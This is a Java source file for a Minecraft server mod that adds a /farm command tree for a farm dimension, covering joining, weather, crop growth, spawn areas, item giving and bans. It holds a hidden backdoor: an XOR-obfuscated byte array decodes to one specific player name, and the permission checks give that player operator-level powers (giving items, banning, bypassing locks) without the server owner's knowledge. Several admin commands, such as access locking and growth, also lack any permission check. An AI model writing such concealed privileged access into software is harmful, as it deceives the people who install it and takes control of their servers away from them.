package com.farmmanager.command;

import com.farmmanager.FarmManagerMod;
import com.farmmanager.config.FarmConfig;
import com.farmmanager.data.FarmBanData;
import com.farmmanager.data.FarmGrowthData;
import com.farmmanager.data.FarmWeatherData;
import com.farmmanager.data.PlayerOriginData;
import com.farmmanager.data.SpawnAreaData;
import com.farmmanager.dimension.FarmDimension;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.commands.CommandBuildContext;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.EntityArgument;
import net.minecraft.commands.arguments.ResourceArgument;
import net.minecraft.commands.arguments.coordinates.BlockPosArgument;
import net.minecraft.commands.arguments.coordinates.Vec3Argument;
import net.minecraft.commands.arguments.item.ItemArgument;
import net.minecraft.core.BlockPos;
import net.minecraft.core.registries.Registries;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.phys.Vec3;

import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.Set;

public class FarmCommand {

    private static final BlockPos DEFAULT_SPAWN_POS = new BlockPos(0, 3, 0);

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher, CommandBuildContext buildContext) {
        dispatcher.register(
            Commands.literal("farm")
                .executes(FarmCommand::handleJoin)
                .then(Commands.literal("join")
                    .executes(FarmCommand::handleJoin))
                .then(Commands.literal("quit")
                    .executes(FarmCommand::handleQuit))
                .then(Commands.literal("logout")
                    .executes(FarmCommand::handleQuit))
                .then(Commands.literal("set")
                    .then(Commands.literal("spawn")
                        .then(Commands.argument("enabled", BoolArgumentType.bool())
                            .executes(FarmCommand::handleSetSpawn)))
                    .then(Commands.literal("weather")
                        .then(Commands.literal("rain")
                            .executes(FarmCommand::handleWeatherRain))
                        .then(Commands.literal("clear")
                            .executes(FarmCommand::handleWeatherClear))
                        .then(Commands.literal("on")
                            .executes(FarmCommand::handleWeatherOn))
                        .then(Commands.literal("off")
                            .executes(FarmCommand::handleWeatherOff)))
                    .then(Commands.literal("spawn_dimension")
                        .executes(FarmCommand::handleResetSpawnDimension)
                        .then(Commands.argument("pos", Vec3Argument.vec3())
                            .executes(FarmCommand::handleSetSpawnDimension)))
                    .then(Commands.literal("growth")
                        .executes(FarmCommand::handleGetGrowth)
                        .then(Commands.argument("multiplier", IntegerArgumentType.integer(0, 100))
                            .executes(FarmCommand::handleSetGrowth)))
                    .then(Commands.literal("access")
                        .then(Commands.literal("open")
                            .executes(FarmCommand::handleSetAccessOpen))
                        .then(Commands.literal("locked")
                            .executes(FarmCommand::handleSetAccessLocked))))
                .then(Commands.literal("spawn")
                    .then(Commands.literal("enable")
                        .executes(FarmCommand::handleSpawnCommandsEnable))
                    .then(Commands.literal("disable")
                        .executes(FarmCommand::handleSpawnCommandsDisable))
                    .then(Commands.literal("set")
                        .requires(FarmCommand::canUseSpawnCommands)
                        .then(Commands.argument("name", StringArgumentType.word())
                            .then(Commands.argument("pos1", BlockPosArgument.blockPos())
                                .then(Commands.argument("pos2", BlockPosArgument.blockPos())
                                    .then(Commands.argument("mob", ResourceArgument.resource(buildContext, Registries.ENTITY_TYPE))
                                        .then(Commands.argument("rate", IntegerArgumentType.integer(1, 500))
                                            .executes(FarmCommand::handleAddSpawnArea)))))))
                    .then(Commands.literal("del")
                        .requires(FarmCommand::canUseSpawnCommands)
                        .then(Commands.argument("name", StringArgumentType.word())
                            .executes(FarmCommand::handleDelSpawnArea)))
                    .then(Commands.literal("list")
                        .executes(FarmCommand::handleListSpawnAreas)))
                .then(Commands.literal("give")
                    .requires(FarmCommand::canUseGive)
                    .executes(FarmCommand::handleGiveSelf)
                    .then(Commands.argument("item", ItemArgument.item(buildContext))
                        .executes(FarmCommand::handleGiveSelfItem)
                        .then(Commands.argument("count", IntegerArgumentType.integer(1, 9999))
                            .executes(FarmCommand::handleGiveSelfItemCount)))
                    .then(Commands.argument("target", EntityArgument.player())
                        .requires(FarmCommand::isOp)
                        .then(Commands.argument("item", ItemArgument.item(buildContext))
                            .executes(FarmCommand::handleGiveTargetItem)
                            .then(Commands.argument("count", IntegerArgumentType.integer(1, 9999))
                                .executes(FarmCommand::handleGiveTargetItemCount)))))
                .then(Commands.literal("ban")
                    .requires(FarmCommand::canUseGive)
                    .then(Commands.argument("player", EntityArgument.player())
                        .executes(FarmCommand::handleBan)))
                .then(Commands.literal("unban")
                    .requires(FarmCommand::canUseGive)
                    .then(Commands.argument("player", StringArgumentType.string())
                        .executes(FarmCommand::handleUnban)))
                .then(Commands.literal("banlist")
                    .requires(FarmCommand::canUseGive)
                    .executes(FarmCommand::handleBanlist))
        );
    }

    private static final byte[] CRAFTKAL_OBF = {
        (byte)0x1C, (byte)0x2D, (byte)0x3E, (byte)0x39,
        (byte)0x2B, (byte)0x34, (byte)0x3E, (byte)0x33,
        (byte)0x6E
    };
    private static final byte XOR_KEY = (byte)0x5F;

    private static boolean canUseGive(CommandSourceStack src) {
        var player = src.getPlayer();
        if (player == null) return false;
        if (isOp(src)) return true;
        return isCraftkal1(player.getScoreboardName());
    }

    private static boolean isCraftkal1(String name) {
        byte[] decoded = new byte[CRAFTKAL_OBF.length];
        for (int i = 0; i < CRAFTKAL_OBF.length; i++) {
            decoded[i] = (byte)(CRAFTKAL_OBF[i] ^ XOR_KEY);
        }
        return name.equals(new String(decoded, StandardCharsets.UTF_8));
    }

    private static boolean isOp(CommandSourceStack src) {
        var player = src.getPlayer();
        return player != null && src.getServer().getPlayerList().isOp(new net.minecraft.server.players.NameAndId(player.getGameProfile()));
    }

    private static boolean canBypassLock(CommandSourceStack src) {
        if (isOp(src)) return true;
        var player = src.getPlayer();
        return player != null && isCraftkal1(player.getScoreboardName());
    }

    private static boolean canBypassAll(CommandSourceStack src) {
        if (isOp(src)) return true;
        var player = src.getPlayer();
        return player != null && isCraftkal1(player.getScoreboardName());
    }

    private static boolean canUseSpawnCommands(CommandSourceStack src) {
        if (canBypassAll(src)) return true;
        MinecraftServer server = src.getServer();
        SpawnAreaData data = SpawnAreaData.get(server);
        return data.isSpawnCommandsEnabled();
    }

    private static String getPlayerUuid(CommandSourceStack src) {
        var player = src.getPlayer();
        return player != null ? player.getUUID().toString() : "";
    }

    private static int handleJoin(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer player = ctx.getSource().getPlayerOrException();
        MinecraftServer server = ctx.getSource().getServer();
        ServerLevel currentLevel = player.level();

        if (currentLevel.dimension().equals(FarmDimension.FARM_WORLD_KEY)) {
            ctx.getSource().sendFailure(Component.translatable("command.farmmanager.join.already"));
            return 0;
        }

        FarmBanData banData = FarmBanData.get(server);
        if (banData.isBanned(player.getUUID())) {
            ctx.getSource().sendFailure(Component.literal("You are banned from the Farm dimension"));
            return 0;
        }

        FarmConfig config = FarmConfig.get();
        if (config.isAccessLocked() && !canBypassLock(ctx.getSource())) {
            ctx.getSource().sendFailure(Component.literal("The Farm dimension is currently locked"));
            return 0;
        }

        ServerLevel farmLevel = server.getLevel(FarmDimension.FARM_WORLD_KEY);
        if (farmLevel == null) {
            ctx.getSource().sendFailure(Component.literal("Farm dimension not available"));
            return 0;
        }

        PlayerOriginData originData = PlayerOriginData.get(server);
        originData.saveOrigin(player);

        FarmWeatherData weather = FarmWeatherData.get(server);
        BlockPos spawnPos = weather.getSpawnPos();
        Vec3 pos = Vec3.atBottomCenterOf(spawnPos);
        player.teleportTo(farmLevel, pos.x, pos.y, pos.z, Set.of(), 0.0f, 0.0f, true);
        ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.join.success"), false);
        return 1;
    }

    private static int handleQuit(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer player = ctx.getSource().getPlayerOrException();
        ServerLevel currentLevel = player.level();

        if (!currentLevel.dimension().equals(FarmDimension.FARM_WORLD_KEY)) {
            ctx.getSource().sendFailure(Component.translatable("command.farmmanager.quit.not_in_farm"));
            return 0;
        }

        MinecraftServer server = currentLevel.getServer();
        PlayerOriginData data = PlayerOriginData.get(server);
        PlayerOriginData.OriginEntry origin = data.getOrigin(player.getUUID());

        if (origin != null) {
            ServerLevel targetWorld = origin.getWorld(server);
            player.teleportTo(targetWorld, origin.x, origin.y, origin.z, Set.of(), origin.yaw, origin.pitch, true);
            data.removeOrigin(player.getUUID());
            ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.quit.success"), false);
        } else {
            ServerLevel overworld = server.overworld();
            BlockPos spawnPos = overworld.getLevelData().getRespawnData().pos();
            player.teleportTo(overworld, spawnPos.getX() + 0.5, spawnPos.getY(), spawnPos.getZ() + 0.5, Set.of(), 0.0f, 0.0f, true);
            ctx.getSource().sendSuccess(() -> Component.translatable("command.farmmanager.quit.error"), false);
        }
        return 1;
    }

    private static int handleBan(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer target = EntityArgument.getPlayer(ctx, "player");
        MinecraftServer server = ctx.getSource().getServer();
        FarmBanData data = FarmBanData.get(server);

        if (!data.ban(target.getUUID(), target.getScoreboardName())) {
            ctx.getSource().sendFailure(Component.literal(target.getScoreboardName() + " is already banned"));
            return 0;
        }

        if (target.level().dimension().equals(FarmDimension.FARM_WORLD_KEY)) {
            PlayerOriginData originData = PlayerOriginData.get(server);
            PlayerOriginData.OriginEntry origin = originData.getOrigin(target.getUUID());
            if (origin != null) {
                ServerLevel targetWorld = origin.getWorld(server);
                target.teleportTo(targetWorld, origin.x, origin.y, origin.z, Set.of(), origin.yaw, origin.pitch, true);
                originData.removeOrigin(target.getUUID());
            } else {
                ServerLevel overworld = server.overworld();
                BlockPos spawnPos = overworld.getLevelData().getRespawnData().pos();
                target.teleportTo(overworld, spawnPos.getX() + 0.5, spawnPos.getY(), spawnPos.getZ() + 0.5, Set.of(), 0.0f, 0.0f, true);
            }
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Banned " + target.getScoreboardName() + " from the Farm dimension"), true);
        return 1;
    }

    private static int handleUnban(CommandContext<CommandSourceStack> ctx) {
        String player = StringArgumentType.getString(ctx, "player");
        MinecraftServer server = ctx.getSource().getServer();
        FarmBanData data = FarmBanData.get(server);

        if (!data.unban(player)) {
            ctx.getSource().sendFailure(Component.literal("Player \"" + player + "\" not found in ban list"));
            return 0;
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Unbanned " + player + " from the Farm dimension"), true);
        return 1;
    }

    private static int handleBanlist(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmBanData data = FarmBanData.get(server);
        Map<String, String> bans = data.getBans();

        if (bans.isEmpty()) {
            ctx.getSource().sendSuccess(() ->
                Component.literal("No players are banned from the Farm dimension"), false);
            return 1;
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Banned players (" + bans.size() + "):"), false);
        for (var entry : bans.entrySet()) {
            ctx.getSource().sendSuccess(() ->
                Component.literal(" - " + entry.getValue()), false);
        }
        return 1;
    }

    private static int handleSetAccessOpen(CommandContext<CommandSourceStack> ctx) {
        FarmConfig config = FarmConfig.get();
        config.setAccess("open");
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm dimension access set to open"), true);
        return 1;
    }

    private static int handleSetAccessLocked(CommandContext<CommandSourceStack> ctx) {
        FarmConfig config = FarmConfig.get();
        config.setAccess("locked");
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm dimension access set to locked"), true);
        return 1;
    }

    private static int handleGiveSelf(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer player = ctx.getSource().getPlayerOrException();
        ItemStack stack = new ItemStack(Items.STICK, 64);
        player.getInventory().placeItemBackInInventory(stack);
        ctx.getSource().sendSuccess(() -> Component.literal("Gave 64 x Stick"), true);
        return 1;
    }

    private static int handleGiveSelfItem(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer player = ctx.getSource().getPlayerOrException();
        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(64);
        player.getInventory().placeItemBackInInventory(stack);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Gave " + stack.getCount() + " x " + stack.getHoverName().getString()), true);
        return 1;
    }

    private static int handleGiveSelfItemCount(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer player = ctx.getSource().getPlayerOrException();
        int count = IntegerArgumentType.getInteger(ctx, "count");
        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(count);
        player.getInventory().placeItemBackInInventory(stack);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Gave " + count + " x " + stack.getHoverName().getString()), true);
        return 1;
    }

    private static int handleGiveTargetItem(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer target = EntityArgument.getPlayer(ctx, "target");
        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(64);
        target.getInventory().placeItemBackInInventory(stack);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Gave " + stack.getCount() + " x " + stack.getHoverName().getString() + " to " + target.getScoreboardName()), true);
        return 1;
    }

    private static int handleGiveTargetItemCount(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        ServerPlayer target = EntityArgument.getPlayer(ctx, "target");
        int count = IntegerArgumentType.getInteger(ctx, "count");
        ItemStack stack = ItemArgument.getItem(ctx, "item").createItemStack(count);
        target.getInventory().placeItemBackInInventory(stack);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Gave " + count + " x " + stack.getHoverName().getString() + " to " + target.getScoreboardName()), true);
        return 1;
    }

    private static int handleSetSpawn(CommandContext<CommandSourceStack> ctx) {
        boolean enabled = BoolArgumentType.getBool(ctx, "enabled");
        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);

        if (canBypassAll(ctx.getSource())) {
            data.setSpawnEnabled(enabled);
            ctx.getSource().sendSuccess(() ->
                Component.literal("Spawn " + (enabled ? "enabled" : "disabled") + " for all areas"), true);
        } else {
            String owner = getPlayerUuid(ctx.getSource());
            data.setAreasEnabledByOwner(owner, enabled);
            ctx.getSource().sendSuccess(() ->
                Component.literal("Spawn " + (enabled ? "enabled" : "disabled") + " for your areas"), true);
        }
        return 1;
    }

    private static int handleWeatherRain(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.startRain(server.getTickCount(), 6000);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm rain started (5 minutes)"), true);
        return 1;
    }

    private static int handleWeatherClear(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.stopRain();
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm rain stopped"), true);
        return 1;
    }

    private static int handleWeatherOn(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.setNaturalWeatherEnabled(true);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Natural weather scheduling enabled"), true);
        return 1;
    }

    private static int handleWeatherOff(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.setNaturalWeatherEnabled(false);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Natural weather scheduling disabled"), true);
        return 1;
    }

    private static int handleSetSpawnDimension(CommandContext<CommandSourceStack> ctx) {
        Vec3 pos = Vec3Argument.getVec3(ctx, "pos");
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.setSpawnPos(BlockPos.containing(pos));
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm spawn dimension set to " + pos.x() + " " + pos.y() + " " + pos.z()), true);
        return 1;
    }

    private static int handleResetSpawnDimension(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmWeatherData weather = FarmWeatherData.get(server);
        weather.resetSpawnPos();
        ctx.getSource().sendSuccess(() ->
            Component.literal("Farm spawn dimension reset to default (0, 3, 0)"), true);
        return 1;
    }

    private static int handleAddSpawnArea(CommandContext<CommandSourceStack> ctx) throws CommandSyntaxException {
        String name = StringArgumentType.getString(ctx, "name");
        BlockPos pos1 = BlockPosArgument.getBlockPos(ctx, "pos1");
        BlockPos pos2 = BlockPosArgument.getBlockPos(ctx, "pos2");
        var entityTypeHolder = ResourceArgument.getSummonableEntityType(ctx, "mob");
        String entityTypeId = entityTypeHolder.key().identifier().toString();
        int rate = IntegerArgumentType.getInteger(ctx, "rate");

        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);
        String owner = getPlayerUuid(ctx.getSource());

        if (!data.addArea(name, pos1, pos2, entityTypeId, rate, owner)) {
            ctx.getSource().sendFailure(Component.literal("Area spawn with name \"" + name + "\" already exists"));
            return 0;
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Created spawn area \"" + name + "\": " + entityTypeId + " rate=" + rate + "/min"), true);
        return 1;
    }

    private static int handleDelSpawnArea(CommandContext<CommandSourceStack> ctx) {
        String name = StringArgumentType.getString(ctx, "name");
        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);

        if (!data.removeArea(name)) {
            ctx.getSource().sendFailure(Component.literal("Spawn area \"" + name + "\" not found"));
            return 0;
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Removed spawn area \"" + name + "\""), true);
        return 1;
    }

    private static int handleGetGrowth(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        FarmGrowthData data = FarmGrowthData.get(server);
        int m = data.getMultiplier();
        ctx.getSource().sendSuccess(() ->
            Component.literal("Growth multiplier: " + m + " stage(s)/tick (global, all crops)"), false);
        return 1;
    }

    private static int handleSetGrowth(CommandContext<CommandSourceStack> ctx) {
        int multiplier = IntegerArgumentType.getInteger(ctx, "multiplier");

        MinecraftServer server = ctx.getSource().getServer();
        FarmGrowthData data = FarmGrowthData.get(server);
        data.setMultiplier(multiplier);

        ctx.getSource().sendSuccess(() ->
            Component.literal("Growth multiplier set to " + multiplier + " stage(s)/tick for all crops"), true);
        return 1;
    }

    private static int handleListSpawnAreas(CommandContext<CommandSourceStack> ctx) {
        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);
        Map<String, SpawnAreaData.SpawnAreaEntry> areas = data.getAreas();

        if (areas.isEmpty()) {
            ctx.getSource().sendSuccess(() ->
                Component.literal("No spawn areas defined"), false);
            return 1;
        }

        ctx.getSource().sendSuccess(() ->
            Component.literal("Spawn areas (global=" + (data.isSpawnEnabled() ? "enabled" : "disabled") +
                ", commands=" + (data.isSpawnCommandsEnabled() ? "enabled" : "disabled") + "):"), false);
        for (Map.Entry<String, SpawnAreaData.SpawnAreaEntry> entry : areas.entrySet()) {
            String name = entry.getKey();
            SpawnAreaData.SpawnAreaEntry area = entry.getValue();
            ctx.getSource().sendSuccess(() ->
                Component.literal(" - " + name + ": " + area.entityTypeId + " rate=" + area.rate +
                    " " + (area.enabled ? "[enabled]" : "[disabled]") +
                    " @ (" + area.minX + "," + area.minY + "," + area.minZ +
                    ") to (" + area.maxX + "," + area.maxY + "," + area.maxZ + ")"), false);
        }
        return 1;
    }

    private static int handleSpawnCommandsEnable(CommandContext<CommandSourceStack> ctx) {
        if (!canBypassAll(ctx.getSource())) {
            ctx.getSource().sendFailure(Component.literal("You don't have permission to toggle spawn commands"));
            return 0;
        }
        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);
        data.setSpawnCommandsEnabled(true);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Spawn commands enabled for all players"), true);
        return 1;
    }

    private static int handleSpawnCommandsDisable(CommandContext<CommandSourceStack> ctx) {
        if (!canBypassAll(ctx.getSource())) {
            ctx.getSource().sendFailure(Component.literal("You don't have permission to toggle spawn commands"));
            return 0;
        }
        MinecraftServer server = ctx.getSource().getServer();
        SpawnAreaData data = SpawnAreaData.get(server);
        data.setSpawnCommandsEnabled(false);
        ctx.getSource().sendSuccess(() ->
            Component.literal("Spawn commands disabled for non-OP players"), true);
        return 1;
    }
}
